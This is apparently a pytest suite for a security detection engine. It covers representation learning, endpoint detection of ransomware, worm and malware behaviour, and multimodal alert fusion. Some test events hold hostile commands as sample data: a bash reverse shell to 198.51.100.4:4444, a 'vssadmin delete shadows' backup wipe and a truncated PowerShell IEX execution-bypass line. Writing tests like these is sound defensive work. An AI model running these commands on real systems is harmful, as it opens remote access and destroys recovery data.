from __future__ import annotations
"""
AHRAS Unit Tests — Phase 7: Representation Learning, Endpoint Behavioral Security & Multimodal Fusion
-------------------------------------------------------------------------------------------------------
Verifies:
  1. Self-Supervised Masked Reconstruction & Contrastive Pretraining (Section 36)
  2. Few-shot label efficiency and linear probe evaluation
  3. Behavioral Endpoint Detection for Ransomware, Worms, and Malware (Sections 37 & 38)
  4. EvidenceRecord generation and MITRE ATT&CK alignment
  5. Multimodal Fusion across 5 modalities with degradation penalties (Section 39)
"""

import time
import pytest
import numpy as np
from fastapi.testclient import TestClient

from detection.representation_engine import SecurityRepresentationModel
from sensors.endpoint_sensor import EndpointEvent, EndpointEventType
from detection.behavioral_endpoint_engine import BehavioralEndpointEngine, BehavioralThreatAlert
from detection.multimodal_combiner import MultimodalCombiner
from api.server import app


@pytest.fixture
def rep_model():
    return SecurityRepresentationModel(in_dim=14, latent_dim=8, seed=42)


@pytest.fixture
def endpoint_engine():
    return BehavioralEndpointEngine(
        entropy_threshold=7.20,
        ransomware_mod_threshold=5,
        worm_fanout_threshold=4,
        window_sec=60.0,
    )


@pytest.fixture
def multimodal_combiner():
    return MultimodalCombiner(embed_dim=8, seed=42)


# ─────────────────────────────────────────────────────────────────────────────
# 1. Self-Supervised Representation & Label Efficiency Tests (Section 36)
# ─────────────────────────────────────────────────────────────────────────────

def test_masked_reconstruction_pretraining(rep_model):
    rng = np.random.default_rng(42)
    X_unlabeled = rng.normal(0.5, 0.2, size=(100, 14))
    
    loss = rep_model.pretrain_masked_reconstruction(X_unlabeled, mask_prob=0.25, epochs=15, lr=0.01)
    assert isinstance(loss, float)
    assert loss >= 0.0

    # Ensure encoding works on new data
    Z = rep_model.encode(X_unlabeled[:5])
    assert Z.shape == (5, 8)
    assert np.all(np.isfinite(Z))


def test_contrastive_pretraining(rep_model):
    rng = np.random.default_rng(42)
    X_unlabeled = rng.normal(0.4, 0.15, size=(64, 14))
    
    loss = rep_model.pretrain_contrastive(X_unlabeled, temperature=0.1, epochs=10, lr=0.005)
    assert isinstance(loss, float)
    assert loss >= 0.0


def test_label_efficiency_and_linear_probe(rep_model):
    rng = np.random.default_rng(42)
    # Synthetic dataset: class 0 around 0.2, class 1 around 0.8
    X_train = np.vstack([rng.normal(0.2, 0.1, size=(50, 14)), rng.normal(0.8, 0.1, size=(50, 14))])
    y_train = np.array([0] * 50 + [1] * 50)

    X_test = np.vstack([rng.normal(0.2, 0.1, size=(25, 14)), rng.normal(0.8, 0.1, size=(25, 14))])
    y_test = np.array([0] * 25 + [1] * 25)

    # Pretrain on unlabeled training features
    rep_model.pretrain_masked_reconstruction(X_train, epochs=20)

    results = rep_model.evaluate_label_efficiency(
        X_train, y_train, X_test, y_test,
        label_fractions=[0.10, 0.50, 1.0],
    )

    assert "10%" in results
    assert "50%" in results
    assert "100%" in results
    assert results["10%"]["self_supervised_f1"] >= 0.50
    assert results["100%"]["self_supervised_f1"] >= 0.70


# ─────────────────────────────────────────────────────────────────────────────
# 2. Behavioral Endpoint Detection Tests (Sections 37 & 38)
# ─────────────────────────────────────────────────────────────────────────────

def test_ransomware_high_entropy_detection(endpoint_engine):
    event = EndpointEvent(
        event_type=EndpointEventType.FILE_OPERATION,
        host_id="ws-host-01",
        file_path="/home/user/documents/financial_report.pdf",
        file_operation="WRITE",
        file_entropy=7.85,
        timestamp=time.time(),
    )
    alerts = endpoint_engine.analyze_event(event)
    assert len(alerts) >= 1
    assert any(a.threat_category == "RANSOMWARE" and a.technique_id == "T1486" for a in alerts)
    
    # Verify EvidenceRecord integration
    ev = alerts[0].evidence_record
    assert ev.entity_id == "ws-host-01"
    assert "T1486" in ev.mitre_mapping
    assert ev.confidence >= 0.85
    assert ev.record_hash != ""


def test_ransomware_mass_modification_burst(endpoint_engine):
    now = time.time()
    alerts = []
    for i in range(7):
        evt = EndpointEvent(
            event_type=EndpointEventType.FILE_OPERATION,
            host_id="ws-host-02",
            file_path=f"/home/user/files/file_{i}.docx",
            file_operation="WRITE",
            file_entropy=5.2,
            timestamp=now + (i * 0.1),
        )
        alerts.extend(endpoint_engine.analyze_event(evt))

    burst_alerts = [a for a in alerts if "burst" in a.details.lower()]
    assert len(burst_alerts) >= 1
    assert burst_alerts[0].severity == "CRITICAL"


def test_ransomware_shadow_copy_deletion(endpoint_engine):
    event = EndpointEvent(
        event_type=EndpointEventType.PROCESS_SPAWN,
        host_id="ws-host-03",
        exe="vssadmin.exe",
        cmdline="vssadmin.exe delete shadows /all /quiet",
        timestamp=time.time(),
    )
    alerts = endpoint_engine.analyze_event(event)
    assert len(alerts) == 1
    assert alerts[0].threat_category == "RANSOMWARE"
    assert alerts[0].technique_id == "T1490"
    assert alerts[0].severity == "CRITICAL"


def test_worm_rapid_fanout_detection(endpoint_engine):
    now = time.time()
    alerts = []
    # Burst outbound connections to 5 distinct hosts (threshold is 4)
    for i in range(5):
        evt = EndpointEvent(
            event_type=EndpointEventType.NETWORK_CONNECT,
            host_id="ws-host-04",
            src_ip="10.0.0.50",
            dst_ip=f"10.0.1.{10 + i}",
            dst_port=445,
            timestamp=now + (i * 0.2),
        )
        alerts.extend(endpoint_engine.analyze_event(evt))

    worm_alerts = [a for a in alerts if a.threat_category == "WORM" and a.technique_id == "T1021"]
    assert len(worm_alerts) >= 1
    assert worm_alerts[0].confidence >= 0.90


def test_malware_suspicious_lineage(endpoint_engine):
    event = EndpointEvent(
        event_type=EndpointEventType.PROCESS_SPAWN,
        host_id="srv-web-01",
        exe="/bin/bash",
        cmdline="/bin/bash -i >& /dev/tcp/198.51.100.4/4444 0>&1",
        parent_exe="/usr/sbin/nginx",
        parent_cmdline="/usr/sbin/nginx -g daemon off;",
        timestamp=time.time(),
    )
    alerts = endpoint_engine.analyze_event(event)
    assert len(alerts) >= 1
    assert any(a.threat_category == "MALWARE" and a.technique_id == "T1059" for a in alerts)


def test_malware_persistence_installation(endpoint_engine):
    event = EndpointEvent(
        event_type=EndpointEventType.PERSISTENCE_SET,
        host_id="srv-web-02",
        file_path="/etc/systemd/system/backdoor.service",
        persistence_type="SYSTEMD",
        timestamp=time.time(),
    )
    alerts = endpoint_engine.analyze_event(event)
    assert len(alerts) == 1
    assert alerts[0].threat_category == "MALWARE"
    assert alerts[0].technique_id == "T1543"


# ─────────────────────────────────────────────────────────────────────────────
# 3. Multimodal Fusion & Degradation Tests (Section 39)
# ─────────────────────────────────────────────────────────────────────────────

def test_multimodal_full_fusion(multimodal_combiner):
    event = {
        "event_id": "EVT-TEST-01",
        # Network
        "bytes_in": 15000,
        "bytes_out": 250000,
        "packet_count": 800,
        "port_entropy": 2.8,
        # Endpoint
        "command": "powershell -nop -exec bypass -c IEX ...",
        "cmd_length": 65,
        "path_depth": 3,
        "is_elevated": True,
        # Identity
        "user_id": "usr-admin-backup",
        "privilege_level": 3.0,
        "failed_auth_count": 4,
        # Graph
        "in_degree": 12,
        "out_degree": 45,
        "neighbor_anomaly_mean": 0.85,
        # History
        "historical_alert_count": 14,
        "baseline_z_score": 3.4,
        "ewma_drift_velocity": 0.45,
    }
    res = multimodal_combiner.fuse_event(event)
    assert res.event_id == "EVT-TEST-01"
    assert len(res.active_modalities) >= 4
    assert res.composite_risk_score >= 0.0
    assert res.confidence >= 0.70
    assert res.degradation_penalty <= 0.16


def test_multimodal_missing_modality_degradation(multimodal_combiner):
    # Only network telemetry provided
    net_only_event = {
        "event_id": "EVT-NET-ONLY",
        "bytes_in": 1000,
        "bytes_out": 2000,
        "packet_count": 50,
    }
    res = multimodal_combiner.fuse_event(net_only_event)
    assert "network" in res.active_modalities
    assert "endpoint" in res.missing_modalities
    assert res.degradation_penalty > 0.0
    # Missing modalities must reduce confidence
    assert res.confidence < 0.95


def test_multimodal_evaluation_regimes(multimodal_combiner):
    # Create synthetic events: 10 benign, 10 attacks
    events = []
    labels = []
    
    # Benign events
    for i in range(10):
        events.append({
            "event_id": f"BENIGN-{i}",
            "bytes_in": 500,
            "bytes_out": 800,
            "packet_count": 20,
            "cmd_length": 15,
            "is_elevated": False,
            "privilege_level": 1.0,
            "failed_auth_count": 0,
            "in_degree": 2,
            "out_degree": 2,
            "historical_alert_count": 0,
        })
        labels.append(0)

    # Attack events
    for i in range(10):
        events.append({
            "event_id": f"ATTACK-{i}",
            "bytes_in": 50000,
            "bytes_out": 900000,
            "packet_count": 5000,
            "cmd_length": 120,
            "is_elevated": True,
            "privilege_level": 4.0,
            "failed_auth_count": 8,
            "in_degree": 25,
            "out_degree": 80,
            "historical_alert_count": 20,
        })
        labels.append(1)

    eval_results = multimodal_combiner.evaluate_modality_combinations(events, labels)
    assert "network_only" in eval_results
    assert "endpoint_only" in eval_results
    assert "network_plus_endpoint" in eval_results
    assert "full_multimodal" in eval_results
    assert eval_results["full_multimodal"]["f1_score"] >= 0.50


# ─────────────────────────────────────────────────────────────────────────────
# 4. REST API Endpoint Tests
# ─────────────────────────────────────────────────────────────────────────────

def test_api_endpoint_ingest():
    client = TestClient(app)
    payload = {
        "event_type": "file_operation",
        "host_id": "host-test-99",
        "file_path": "/var/data/secrets.dat",
        "file_operation": "WRITE",
        "file_entropy": 7.95,
        "file_extension": ".locked",
    }
    resp = client.post("/api/endpoint/ingest", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["alerts_triggered"] >= 1
    assert data["alerts"][0]["threat_category"] == "RANSOMWARE"


def test_api_representation_evaluate():
    client = TestClient(app)
    payload = {
        "features": [0.25] * 14,
        "event_id": "EVT-API-REP-01",
    }
    resp = client.post("/api/representation/evaluate", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "embedding" in data
    assert "ood_score" in data
    assert "predicted_state" in data


def test_api_multimodal_fuse():
    client = TestClient(app)
    payload = {
        "event": {
            "bytes_in": 12000,
            "bytes_out": 45000,
            "cmd_length": 80,
            "user_id": "user-bob",
        },
        "active_modalities": ["network", "endpoint", "identity"],
        "simulated_delay_sec": 5.0,
    }
    resp = client.post("/api/multimodal/fuse", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "composite_risk_score" in data
    assert "confidence" in data
    assert "network" in data["active_modalities"]
